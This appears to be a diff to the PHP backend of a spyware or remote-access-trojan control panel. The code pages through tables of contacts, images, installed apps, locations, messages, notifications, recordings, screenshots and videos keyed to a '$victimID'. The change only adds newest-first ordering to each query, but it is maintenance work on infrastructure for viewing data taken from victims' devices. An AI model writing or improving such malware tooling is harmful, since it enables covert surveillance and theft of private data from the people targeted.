@@ -738,7 +738,7 @@ class ControlPanel extends Base
         $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
             
         $contacts = [];
-        $query = "SELECT * FROM CONTACT WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $query = "SELECT * FROM CONTACT WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -768,7 +768,7 @@ class ControlPanel extends Base
         $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
 
         $images = [];
-        $query = "SELECT * FROM IMAGE WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $query = "SELECT * FROM IMAGE WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -798,7 +798,7 @@ class ControlPanel extends Base
         $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
 
         $installedApps = [];
-        $query = "SELECT * FROM INSTALLED_APP WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $query = "SELECT * FROM INSTALLED_APP WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -829,7 +829,7 @@ class ControlPanel extends Base
         $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
 
         $knownLocations = [];
-        $query = "SELECT * FROM LOCATION WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $query = "SELECT * FROM LOCATION WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -861,7 +861,7 @@ class ControlPanel extends Base
         $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
 
         $messages = [];
-        $query = "SELECT * FROM MESSAGE WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $query = "SELECT * FROM MESSAGE WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -892,7 +892,7 @@ class ControlPanel extends Base
         $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
 
         $notifications = [];
-        $query = "SELECT * FROM NOTIFICATION WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $query = "SELECT * FROM NOTIFICATION WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -923,7 +923,7 @@ class ControlPanel extends Base
         $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
 
         $recordings = [];
-        $query = "SELECT * FROM RECORDING WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $query = "SELECT * FROM RECORDING WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -953,7 +953,7 @@ class ControlPanel extends Base
         $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
 
         $screenshots = [];
-        $query = "SELECT * FROM SCREENSHOT WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $query = "SELECT * FROM SCREENSHOT WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -983,7 +983,7 @@ class ControlPanel extends Base
         $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
 
         $videos = [];
-        $query = "SELECT * FROM VIDEO WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $query = "SELECT * FROM VIDEO WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
